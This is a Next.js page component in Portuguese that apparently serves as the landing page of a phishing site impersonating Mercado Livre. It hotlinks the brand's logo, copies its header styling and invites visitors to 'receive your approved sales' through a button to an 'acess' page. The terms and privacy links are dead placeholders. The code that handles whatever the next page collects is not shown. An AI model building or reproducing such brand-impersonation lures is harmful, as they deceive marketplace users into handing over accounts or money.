"use client";

import { useEffect, useState } from "react";

import { LoadingComponent } from "@/loading";
import { useRouter } from "next/navigation";

export default function HomePage() {
  const router = useRouter();

  const [loading, setLoading] = useState(true);
  useEffect(() => {
    setTimeout(() => {
      setLoading(false);
    }, 1500);
  }, []);

  const next = () => router.push("acess");

  if (loading) {
    return <LoadingComponent />;
  }

  return (
    <div>
      <header>
        <nav className="flex p-4 items-center justify-between  bg-[#FFE600] shadow-md">
          <button className="text-4xl">☰</button>

          <a href="./" aria-label="ir para a página inicial">
            <img src="https://http2.mlstatic.com/frontend-assets/ml-web-navigation/ui-navigation/6.6.117/mercadolibre/pt_logo_large_plus@2x.webp" />
          </a>

          <div className="flex items-center">
            <a href="#" className="text-xl">
              Entrar
            </a>
          </div>
        </nav>
      </header>

      <main className="flex flex-col items-center justify-center mt-10 px-10 w-screen">
        <div className="bg-[#2968C8] p-6 flex flex-col items-center gap-4 rounded-xl w-full">
          <h2 className="text-[#fff] text-5xl font-bold">Aviso</h2>

          <p className="text-2xl text-center text-[#fff]">
            {`Olá, seja bem vindo a central de vendas aprovadas em nosso sistema, clique em "avançar" e saiba mais.`}
          </p>
        </div>

        <div className="flex flex-col justify-center items-center mt-4">
          <svg
            width="60"
            height="60"
            viewBox="0 0 100 100"
            xmlns="http://www.w3.org/2000/svg"
          >
            <polygon points="50,80 10,20 90,20" fill="#2968C8" />
          </svg>

          <h2 className="text-3xl font-bold">Chegue chegando</h2>
          <p className="text-xl mt-2 mb-4">Receba suas vendas</p>

          <button
            className="bg-[#2968C8] w-auto text-white px-4 py-2 rounded-md text-xl"
            onClick={next}
          >
            Avançar
          </button>

          <p className="text-base text-center mt-4">
            Ao criar uma conta, você está de acordo com os{" "}
            <a href="#" className="text-[#2968C8]">
              termos de serviço{" "}
            </a>{" "}
            e a{" "}
            <a href="#" className="text-[#2968C8]">
              política de privacidade
            </a>{" "}
            do meli.
          </p>
        </div>
      </main>
    </div>
  );
}
